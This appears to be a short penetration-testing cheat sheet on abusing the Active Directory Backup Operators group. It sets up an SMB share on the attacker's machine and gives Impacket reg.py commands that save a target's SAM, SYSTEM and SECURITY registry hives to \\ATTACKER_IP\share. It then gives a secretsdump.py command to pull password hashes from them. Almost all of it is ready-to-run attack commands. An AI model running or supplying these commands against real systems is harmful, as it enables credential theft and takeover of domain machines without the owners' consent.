**Backup Operators** is a built-in group in Active Directory environments that grants members the ability to back up and restore files, regardless of file permissions. Members of this group can bypass NTFS permissions to perform backup and restore operations on the system.

### Create a location to save information

```bash
mkdir share
cd share
sudo smbserver.py share . -smb2support
```

### Run the attack

```bash
reg.py domain/user:password@target save -keyName 'HKLM\SAM' -o '\\ATTACKER_IP\share'
reg.py domain/user:password@target save -keyName 'HKLM\SYSTEM' -o '\\ATTACKER_IP\share'
reg.py domain/user:password@target save -keyName 'HKLM\SECURITY' -o '\\ATTACKER_IP\share'
```

### Extract the information

```bash
secretsdump.py -sam SAM.save -security SECURITY.save -system SYSTEM.save LOCAL
```

